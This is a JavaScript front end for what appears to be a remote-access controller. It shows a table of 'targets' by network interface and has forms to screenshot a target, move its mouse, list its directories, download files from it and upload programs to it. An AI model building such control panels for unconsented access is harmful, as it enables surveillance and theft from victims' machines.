function renderTargetTable(targets) {
  // Create the table element
  var table = $(
    '<table class="table border border-1 border-black table-striped rounded"></table>',
  );

  // Create the table header
  var thead = $('<thead></thead>').appendTo(table);
  var headerRow = $('<tr></tr>').appendTo(thead);
  $('<th>Name</th>').appendTo(headerRow);
  $('<th>IPV4</th>').appendTo(headerRow);
  $('<th>IPV6</th>').appendTo(headerRow);
  $('<th>MAC</th>').appendTo(headerRow);

  // Create the table body
  var tbody = $('<tbody></tbody>').appendTo(table);

  // Loop through the targets array and create table rows
  for (var i = 0; i < targets.length; i++) {
    var target = targets[i];

    // Create a clickable row that redirects to the control page
    var row = $('<tr></tr>').appendTo(tbody);

    // Add table cells with the target data
    $('<td></td>').text(target.iface).appendTo(row);
    $('<td></td>').text(target.ip4).appendTo(row);
    $('<td></td>').text(target.ip6).appendTo(row);
    $('<td></td>').text(target.mac).appendTo(row);
  }

  // Append the table to a container element
  $('#targetTableContainer').empty().append(table);
}

$(async () => {
  const targetId = $('div').attr('id');
  const response = await axios.get('/target');
  const targets = response.data;
  const target = targets.find((target) => target._id === targetId);
  renderTargetTable(target.ware_info.network);

  document
    .getElementById('screenshotBtn')
    .addEventListener('click', function () {
      axios
        .get(`/target/screenshot/${targetId}`)
        .then(function (response) {
          alert('Screenshot taken successfully.');
        })
        .catch(function (error) {
          alert('Error taking screenshot:', error);
        });
    });

  document
    .getElementById('mouseForm')
    .addEventListener('submit', function (event) {
      event.preventDefault(); // Prevent default form submission behavior

      // Get the values of the x and y inputs
      var x = document.getElementById('xInput').value;
      var y = document.getElementById('yInput').value;

      // Make a GET request to "/target/move-mouse" with x and y parameters
      axios
        .get(`/target/move-mouse/${targetId}`, {
          params: {
            x: x,
            y: y,
          },
        })
        .then(function (response) {
          alert('Mouse moved successfully.');
        })
        .catch(function (error) {
          alert('Error moving mouse:', error);
        });
    });

  document
    .getElementById('downloadForm')
    .addEventListener('submit', function (event) {
      event.preventDefault(); // Prevent default form submission behavior

      // Get the value of the path input
      var path = document.getElementById('pathInput').value;

      // Make a GET request to "/target/download-files" with the path parameter
      axios
        .get(`/target/download-files/${targetId}`, {
          params: {
            path: path,
          },
        })
        .then(function (response) {
          alert('File downloaded successfully.');
          // Handle the response, e.g., display a success message or perform further actions
        })
        .catch(function (error) {
          alert('Error downloading file:', error);
          // Handle the error, e.g., display an error message or perform alternative actions
        });
    });

  document
    .getElementById('directoryForm')
    .addEventListener('submit', function (event) {
      event.preventDefault(); // Prevent default form submission behavior

      // Get the value of the path input
      var path = document.getElementById('directoryInput').value;

      // Make a GET request to "/target/ls" with the path parameter
      axios
        .get(`/target/ls/${targetId}`, {
          params: {
            path: path,
          },
        })
        .then(function (response) {
          alert('Directory list retrieved successfully.');
          // Handle the response, e.g., display the data in a textarea
          document.getElementById('ls-result').value = response.data;
        })
        .catch(function (error) {
          alert('Error retrieving directory list:', error);
          // Handle the error, e.g., display an error message or perform alternative actions
        });
    });
  document
    .getElementById('programForm')
    .addEventListener('submit', function (event) {
      event.preventDefault(); // Prevent default form submission behavior

      // Get the selected program file
      var programFile = document.getElementById('programInput').files[0];

      // Create a FormData object
      var formData = new FormData();
      formData.append('file', programFile);

      // Make a POST request to "/target/upload-file" with the program file
      axios
        .post(`/target/upload-file/${targetId}`, formData)
        .then(function (response) {
          alert('Program uploaded successfully.');
          // Handle the response, e.g., display a success message or perform further actions
        })
        .catch(function (error) {
          alert('Error uploading program:', error);
          // Handle the error, e.g., display an error message or perform alternative actions
        });
    });
});
